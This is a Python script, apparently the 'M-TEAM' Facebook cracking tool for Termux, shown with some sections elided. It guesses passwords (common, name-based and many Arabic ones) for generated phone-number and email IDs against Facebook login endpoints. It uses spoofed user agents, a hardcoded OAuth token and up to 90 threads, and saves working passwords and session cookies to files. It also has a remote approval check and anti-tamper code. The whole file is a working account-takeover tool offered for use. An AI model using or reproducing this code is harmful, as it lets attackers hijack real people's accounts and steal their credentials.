#---------------------[IMPORT]---------------------#
from os import path
import os,base64,zlib,pip,urllib,socket
import uuid
...
def jalan(z):
	for e in z + "\n":
		...
		time.sleep(0.05)
os.system('clear') 
jalan('\n\033[1;32m[•]   JOIN MY TELEGRAM CHANNEL');time.sleep(1);os.system('xdg-open https://t.me/mteam12')
os.system('clear');jalan('\n\033[1;32m[•]   LODING SYSTEM')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests');os.system("pkg install espeak")
...
YELLOW = '\033[1;33m'
WHITE = '\033[1;37m'
G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m'
my_color = [
 P, M, H, K, B, U, O, N,RED,GREEN,BLUE,YELLOW,WHITE,G1,G2,G3,G4,G5]
warna = random.choice(my_color)
folder_path = "/sdcard/M-TEAM"
try:
...
#_______________NAME. SESSION _________
sys.stdout.write('\x1b[1;35m\x1b]2; M-TEAM••— \x07')
...
#_____________useragents_________
try:
...
for xd in range(5000):
    ...
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    moad.append(uaku2)
os.system('clear');os.system('espeak -a 300 " Welcome,   to,  M, TEAM  Tool"');os.system('clear');jalan('\n\033[1;32m[•]   WELCOME TOO NALUTY TOOLS')  
AUTHOR='@J11IU'
TELEGRAM='@H12H5'
GITHUB='NALUTY707'
#VERSION='1.1'
def X1():
    ...
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,312)) +";FBBV/"+str(random.randint(1111111,7777777))
    b = ";[FBAN/FB4A;FBAV/196.0.0.64;FBBV/875160775;FBDM/{density=1.75,width=720,height=1515};FBLC/en_GB;FBRV/444327309;FBCR/Maxcom;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2237;FBSV/12.0.3;nullFBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua
logo=(f"""                  
{G1}███╗   ███╗   ████████╗███████╗ █████╗ ███╗   ███╗
...
if 'ON' in servr: 
	...
	print(logo);print('\033[1;32m[\033[1;37m+\033[1;32m] Sorry tool is Off ');exit()
...
def meyexudi():
  ...
  uuid = str(os.geteuid())
  id = "".join(uuid)
  nn = random.choice(['X1X','V1V','T1T','O1O','F1F','J1J','N1N'])
  id1 =f'M-TEAM-{nn}{id}{nn}'
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/NALUTY707/prv/main/aprovall').text
    if id in httpCaht:
      msg = str(os.geteuid())
      riaz() 
      pass
...
def clr():
    try:
        ...
        if 'Android' in data:
            print(f' DO NOT DO THIS AGAIN');exit()
        else:exit()
    except:exit()
...
if "print" in x:
    ...
    clr()
elif "requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={G}''')" in x: 
	clr() 
else:
    pass
...
def riaz():
	clear();print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} COUNTRY :{GREEN} {loc}");print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} CITY    :{GREEN} {regi}");print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} NETWORK :{GREEN} {network}");print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} YOUR IP :{GREEN} {ip}");lines() 
	print('[1] RANDOM CRACK ');print(f'[2] GMAIL CRACK {G1}[TEST]{WHITE}');print('[2] FOLLOW MY TELEGRAM ');print('[0]\x1b[1;91m EXIT ')
	print(f'{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	riaz1 = input('[•] SELECT OPTION : ')
	if riaz1 =='0':exit()
	if riaz1 =='2':__Gmailx__()
	if riaz1 =='3':os.system('xdg-open https://t.me/H12H5')
	if riaz1 =='1':b1()
	else:print('\n\033[1;31m CHOOSE VALID OPTION\033[0;97m');riaz()
#________________menu pass _____$$$$$$$
def __Gmailx__():
    clear()
    user=[]
    try:
        clear();print(' EXAMPLE : 2000,3000,5000,10000');lines()
        limit = int(input(' GMAIL LIMIT : '))
    except ValueError:
        limit=5000
    ...
    with ThreadPool(max_workers=30) as Asifxxxx:
        total=str(len(user))
        clear();print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} COUNTRY :{GREEN} {loc}");print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} CITY    :{GREEN} {regi}");print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} NETWORK :{GREEN} {network}");print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} YOUR IP :{GREEN} {ip}");lines();print(f'{WHITE}[{GREEN}•{WHITE}] GMAIL UID : {GREEN}'+total+f' {WHITE}|{GREEN} METHOD 1');print(f'{WHITE}[{GREEN}•{WHITE}] USE FLIGHT MODE EVERY 2 MIN');lines()
        for digitx in user:
            m=random.choice(['@gmail.com','@yahoo.com','@hotmail.com','@aol.com','@protonmail.com','@yandex.com','@live.com'])
            first=random.choice(['ali','Ali','mohammed','mohamed','Mohammed','Mohamed','Ahmed','Ahmad','ahmed','ahmad','libya','Libya','aya','sara','morad','moad','mohaned','serag','abdo','Abdo','tarek','mariam','rema','anwar','asma','Khawla',])
            last=random.choice(['ali','Ali','mohammed','mohamed','Mohammed','Mohamed','Ahmed','Ahmad','ahmed','ahmad','libya','Libya'])
            dig=random.choice(['091','092','12','11','01','02','03','04','05','06','07','08','09','1990','1991','1992','1993','1994','1995','1996','1997','1998','1999','2000','2001','2002','2003','2004','2005','2006','2007','2008','2009',digitx])
            nokta=random.choice(['.','_','']) 
            u1=first+last+nokta+digitx+m
            u2=first+nokta+dig+m
            u3=first+nokta+last+dig+m
            u4=first+nokta+first+dig+m
            u5=first+nokta+dig+dig+m
            username=random.choice([u1,u2,u3]) 
            pswrd = [first,last,first+last,first+first,first+dig,last+last,last+first,first+last+dig,first+first+dig,last+last+dig,first+dig+last,first+dig+first,first+dig+dig,dig+dig,first+'123',first+last+'123',first+first+'123',first+'1234',first+last+'1234',first+first+'1234',first+'12345',first+last+'12345',first+first+'12345',last+'123',last+'1234',last+'12345',last+last+'12345','22446688','١٢٣٤٥٦','١٢٣٤٥٦٧٨','qwertyuiopasdfghjkl','qwertyuiopasdfghjklzxcvbnm']
            Asifxxxx.submit(__GMAILX__,username,pswrd,total)
    print('');lines();print(f"[•] CLONING COMPLETE ");print(f"[•] TOTAL OK ID :{G1} {len(oks)}");print(f"{WHITE}[•] TOTAL CP ID :\033[1;31m {len(cps)}");lines();exit()
    
		
def b1():
    user=[]
    def code():m =str(random.choice(range(1,4)));m1 =f'2189{m}';return m1
    clear();print(' EXAMPLE : 2000,3000,5000,10000');lines()
    try:
    	limit = int(input(' IDZ LIMIT : '))
    except: 
    	limit = 10000
    clear();code = input(' ENTER SIM CODE : ')
    clear();print(f'{WHITE}[1] METHOD {G1}1');print(f'{WHITE}[2] METHOD {G2}2');print(f'{WHITE}[3] METHOD {G3}3');print(f'{WHITE}[4] METHOD {G4}4');print(f'{WHITE}[5] METHOD {G5}5');lines();mthd = input('[•] SELECT OPTION : ')
    clear();print(f'{WHITE}[1]{G1} CRACK NAMES LIKE ABDOABDO {WHITE}[SLOW]');print(f'{WHITE}[2]{G1} CRACK NUMBERS LIKE 091******* ');print(f'{WHITE}[3]{G1} CRACK RANDOM PASS');print(f'{WHITE}[4]{G1} CRACK LITTLE PASS {WHITE}[FAST]');print(f'{WHITE}[0]\x1b[1;91m BACK MENU');lines();mpass = input('[+] SELECT OPTION : ')
    for nmbr in range(limit):
    ...
    with ThreadPool(max_workers=90) as yaari:
        clear()
        tl = str(len(user))
        print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} COUNTRY :{GREEN} {loc}");print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} CITY    :{GREEN} {regi}");print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} NETWORK :{GREEN} {network}");print(f"{WHITE}[{GREEN}•{WHITE}]{WHITE} YOUR IP :{GREEN} {ip}")
        lines() 
        print(f'{WHITE}[{GREEN}•{WHITE}] TOTAL UID : {GREEN}'+tl+f' {WHITE}|{GREEN} METHOD/PASS {mthd}/{mpass}');print(f'{WHITE}[{GREEN}•{WHITE}] USE FLIGHT MODE EVERY 2 MIN')
        lines()
        for guru in user:
            uid = code+guru
            if mpass in ['01','1'] and mthd in ['1','01']:pwx=['abdoabdo','abdo abdo','abdo123','عبدوعبدو','عبدو عبدو','mohamedmohamed','mohamed mohamed','mohamed123','محمدمحمد','محمد محمد','محمد123','aliali','ali ali','ali123','عليعلي','علي علي','على على'];yaari.submit(api1,uid,pwx,tl)
            elif mpass in ['01','1'] and mthd in ['2','02']:pwx=['abdoabdo','abdo abdo','abdo123','عبدوعبدو','عبدو عبدو','mohamedmohamed','mohamed mohamed','mohamed123','محمدمحمد','محمد محمد','محمد123','aliali','ali ali','ali123','عليعلي','علي علي','على على'];yaari.submit(api2,uid,pwx,tl)
            elif mpass in ['01','1'] and mthd in ['3','03']:pwx=['abdoabdo','abdo abdo','abdo123','عبدوعبدو','عبدو عبدو','mohamedmohamed','mohamed mohamed','mohamed123','محمدمحمد','محمد محمد','محمد123','aliali','ali ali','ali123','عليعلي','علي علي','على على'];yaari.submit(api3,uid,pwx,tl)
            elif mpass in ['01','1'] and mthd in ['4','04']:pwx=['abdoabdo','abdo abdo','abdo123','عبدوعبدو','عبدو عبدو','mohamedmohamed','mohamed mohamed','mohamed123','محمدمحمد','محمد محمد','محمد123','aliali','ali ali','ali123','عليعلي','علي علي','على على'];yaari.submit(api4,uid,pwx,tl)
            elif mpass in ['01','1'] and mthd in ['5','05']:pwx=['abdoabdo','abdo abdo','abdo123','عبدوعبدو','عبدو عبدو','mohamedmohamed','mohamed mohamed','mohamed123','محمدمحمد','محمد محمد','محمد123','aliali','ali ali','ali123','عليعلي','علي علي','على على'];yaari.submit(api5,uid,pwx,tl)
            elif mpass in ['02','2'] and mthd in ['1','01']:pwx=[guru+guru,guru,code()+guru,'091'+guru,'092'+guru,'094'+guru,'093'+guru,'091'+guru+'091'+guru,'092'+guru+'092'+guru,'094'+guru+'094'+guru];yaari.submit(api1,uid,pwx,tl)
            elif mpass in ['02','2'] and mthd in ['2','02']:pwx=[guru+guru,guru,code()+guru,'091'+guru,'092'+guru,'094'+guru,'093'+guru,'091'+guru+'091'+guru,'092'+guru+'092'+guru,'094'+guru+'094'+guru];yaari.submit(api2,uid,pwx,tl) 
            elif mpass in ['02','2'] and mthd in ['3','03']:pwx=[guru+guru,guru,code()+guru,'091'+guru,'092'+guru,'094'+guru,'093'+guru,'091'+guru+'091'+guru,'092'+guru+'092'+guru,'094'+guru+'094'+guru];yaari.submit(api3,uid,pwx,tl)
            elif mpass in ['02','2'] and mthd in ['4','04']:pwx=[guru+guru,guru,code()+guru,'091'+guru,'092'+guru,'094'+guru,'093'+guru,'091'+guru+'091'+guru,'092'+guru+'092'+guru,'094'+guru+'094'+guru];yaari.submit(api4,uid,pwx,tl)
            elif mpass in ['02','2'] and mthd in ['5','05']:pwx=[guru+guru,guru,code()+guru,'091'+guru,'092'+guru,'094'+guru,'093'+guru,'091'+guru+'091'+guru,'092'+guru+'092'+guru,'094'+guru+'094'+guru];yaari.submit(api5,uid,pwx,tl)
            elif mpass in ['03','3'] and mthd in ['1','01']:pwx=[guru,'22446688','123456','١٢٣٤٥٦','١٢٣٤٥٦٧٨','091091091','092092092','qwertyuiopasdfghjkl','qwertyuiopasdfghjklzxcvbnm','poiuytrewqlkjhgfdsa','10002000','qqwweerrttyyuuiioopp'];yaari.submit(api1,uid,pwx,tl)
            elif mpass in ['03','3'] and mthd in ['2','02']:pwx=[guru,'22446688','123456','١٢٣٤٥٦','١٢٣٤٥٦٧٨','091091091','092092092','qwertyuiopasdfghjkl','qwertyuiopasdfghjklzxcvbnm','poiuytrewqlkjhgfdsa','10002000','qqwweerrttyyuuiioopp'];yaari.submit(api2,uid,pwx,tl)
            elif mpass in ['03','3'] and mthd in ['3','03']:pwx=[guru,'22446688','123456','١٢٣٤٥٦','١٢٣٤٥٦٧٨','091091091','092092092','qwertyuiopasdfghjkl','qwertyuiopasdfghjklzxcvbnm','poiuytrewqlkjhgfdsa','10002000','qqwweerrttyyuuiioopp'];yaari.submit(api3,uid,pwx,tl)
            elif mpass in ['03','3'] and mthd in ['4','04']:pwx=[guru,'22446688','123456','١٢٣٤٥٦','١٢٣٤٥٦٧٨','091091091','092092092','qwertyuiopasdfghjkl','qwertyuiopasdfghjklzxcvbnm','poiuytrewqlkjhgfdsa','10002000','qqwweerrttyyuuiioopp'];yaari.submit(api4,uid,pwx,tl)
            elif mpass in ['03','3'] and mthd in ['5','05']:pwx=[guru,'22446688','123456','١٢٣٤٥٦','١٢٣٤٥٦٧٨','091091091','092092092','qwertyuiopasdfghjkl','qwertyuiopasdfghjklzxcvbnm','poiuytrewqlkjhgfdsa','10002000','qqwweerrttyyuuiioopp'];yaari.submit(api5,uid,pwx,tl) 
            elif mpass in ['04','4'] and mthd in ['1','01']:pwx=[guru,'qwertyuiopasdfghjklzxcvbnm','qwertyuiopasdfghjkl','qwertyuiopzxcvbnm'];yaari.submit(api1,uid,pwx,tl)
            elif mpass in ['04','4'] and mthd in ['2','02']:pwx=[guru,'qwertyuiopasdfghjklzxcvbnm','qwertyuiopasdfghjkl','qwertyuiopzxcvbnm'];yaari.submit(api1,uid,pwx,tl)           
            elif mpass in ['04','4'] and mthd in ['3','03']:pwx=[guru,'qwertyuiopasdfghjklzxcvbnm','qwertyuiopasdfghjkl','qwertyuiopzxcvbnm'];yaari.submit(api1,uid,pwx,tl)         
            elif mpass in ['04','4'] and mthd in ['4','04']:pwx=[guru,'qwertyuiopasdfghjklzxcvbnm','qwertyuiopasdfghjkl','qwertyuiopzxcvbnm'];yaari.submit(api1,uid,pwx,tl)        
            elif mpass in ['04','4'] and mthd in ['5','05']:pwx=[guru,'qwertyuiopasdfghjklzxcvbnm','qwertyuiopasdfghjkl','qwertyuiopzxcvbnm'];yaari.submit(api1,uid,pwx,tl)
            else:pwx=[guru,'qwertyuiopasdfghjklzxcvbnm','qwertyuiopasdfghjkl','qwertyuiopzxcvbnm'];yaari.submit(api2,uid,pwx,tl) 
    print('');lines();print(f"[•] CLONING COMPLETE ");print(f"[•] TOTAL OK ID :{G1} {len(oks)}");print(f"{WHITE}[•] TOTAL CP ID :\033[1;31m {len(cps)}");lines();exit()
#________________M1 _____$$$$$$$
def api1(uid,pwx,tl):
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            x = random.choice(my_color)
            pro1 = random.choice(ugen)
            pro2 = random.choice(moad)
            pro = random.choice([pro1,pro2])
            session = requests.Session()
            sys.stdout.write(f'\r{WHITE}[{x}M-TEAM{WHITE}]-[%s]-{GREEN}OK{WHITE}/{RED}CP{WHITE}<>{GREEN}%s{WHITE}/{RED}%s\r{WHITE}'%(loop,len(oks),len(cps)));sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = "1000"+coki1[0:11]
                print('\033[1;32m[M-TEAM-OK] '+cid+' | '+ps+f'{WHITE} '+joined(cid)+f'{WHITE}')
                os.system('espeak -a 300 " OK,  ID "')
                oks.append(cid)
                open('/sdcard/M-TEAM/M-TEAM-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki1 = coki.split("1000")[1]
                cid = "1000"+coki1[0:11]
                #print('\033[1;31m[M-TEAM-CP] '+cid+' | '+ps+f'{WHITE} '+joined(cid)+f'{WHITE}')
                os.system('espeak -a 300 " CP,  ID "')
                open('/sdcard/M-TEAM/M-TEAM-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
...
#_______________M2_________________
def api2(uid,pwx,tl):
	global loop,oks,cps
	x = random.choice(my_color)
	sys.stdout.write(f'\r{WHITE}[{x}M-TEAM{WHITE}]-[%s]-{GREEN}OK{WHITE}/{RED}CP{WHITE}<>{GREEN}%s{WHITE}/{RED}%s\r{WHITE}'%(loop,len(oks),len(cps)));sys.stdout.flush()
	...
	for ps in pwx:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				coki = "datr=" + cok["datr"] + ";" + ("sb=" + cok["sb"]) + ";" + "locale=en_US" + ";" + ("c_user=" + cok["c_user"]) + ";" + ("xs=" + cok["xs"]) + ";" + ("fr=" + base64.b64encode(os.urandom(30)).decode().replace("=","").replace("+","_").replace("/","-")) + ";" + ("m_page_voice="+cok["c_user"]) + ";ps_n=0;ps_l=0;m_pixel_ratio=2;wd=360x820;"
				cid = re.search('user=(.*?);',str(cok)).group(1)
				if cid in str(oks):
					break
				print('\r\r\033[1;32m[M-TEAM-OK] '+cid+' | '+ps+f'{WHITE} '+joined(cid)+f'{WHITE}');cek_RAVEN(coki);os.system('espeak -a 300 " OK,  ID "');oks.append(uid);open('/sdcard/M-TEAM/M-TEAM-OK.txt','a').write(cid+'|'+ps+'|'+cok1+'\n');break
				...
				try:
					...
					ids = ids
				open('/sdcard/M-TEAM/M-TEAM-CP.txt','a').write(uid+'|'+ps+'\n')
				cps.append(ids)
				break
			else:continue
		except (requests.exceptions.ConnectionError):
    ...
    try:
        for ps in pwx:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print('\033[1;32m[M-TEAM-OK] '+cid+' | '+ps+f'{WHITE} '+joined(cid)+f'{WHITE}');os.system('espeak -a 300 " OK,  ID "');oks.append(cid);open('/sdcard/M-TEAM/M-TEAM-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n');break
                if res == 'LOCK':
                	print('\033[1;31m[M-TEAM-CP] '+cid+' | '+ps+f'{WHITE} '+joined(cid)+f'{WHITE}');break
            else:continue
        loop+=1
    except Exception as e:
        pass	
#________________M4_____$$$$$$$
def api4(uid,pwx,tl):
    global loop,oks,cps
    x = random.choice(my_color)
    sys.stdout.write(f'\r{WHITE}[{x}M-TEAM{WHITE}]-[%s]-{GREEN}OK{WHITE}/{RED}CP{WHITE}<>{GREEN}%s{WHITE}/{RED}%s\r{WHITE}'%(loop,len(oks),len(cps)));sys.stdout.flush()
...
def api5(uid,pwx,tl):
    ...
    try:
        for ps in pwx: 
            session=requests.Session()
            x = random.choice(my_color);sys.stdout.write(f'\r{WHITE}[{x}M-TEAM{WHITE}]-[%s]-{GREEN}OK{WHITE}/{RED}CP{WHITE}<>{GREEN}%s{WHITE}/{RED}%s\r{WHITE}'%(loop,len(oks),len(cps)));sys.stdout.flush()
            ...
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]',
            'viewport-width': '421',
            'x-asbd-id': '129477',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = "1000"+coki1[0:11]
                print('\033[1;31m[M-TEAM-CP] '+cid+' | '+ps+f'{WHITE} '+joined(cid)+f'{WHITE}')
                open('/sdcard/M-TEAM/M-TEAM.CP.txt','a').write(idf+'|'+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
...
def __GMAILX__(username,pswrd,total):
    ...
    try:
        for password in pswrd:
            ...
            header={'User-Agent': X1(), 'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793','X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'} 
            login_url='https://api.facebook.com/method/auth.login'
            req=httpx.post(login_url,data=connection,headers=header).json()
            if 'session_key' in req:
                print('\033[1;32m[M-TEAM-OK] '+username+' | '+password+f'{WHITE}');os.system('espeak -a 300 " OK,  ID "')
                open('/sdcard/M-TEAM/M-TEAM-GMAIL-OK.txt', 'a').write(username+' | '+password+'\n')
                oks.append(username)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print('\033[1;31m[M-TEAM-CP] '+username+' | '+password+f'{WHITE}')
                open('/sdcard/M-TEAM/M-TEAM-GMAIL-CP.txt', 'a').write(username+' | '+password+'\n')
                cps.append(username)
                break
            else:
                continue
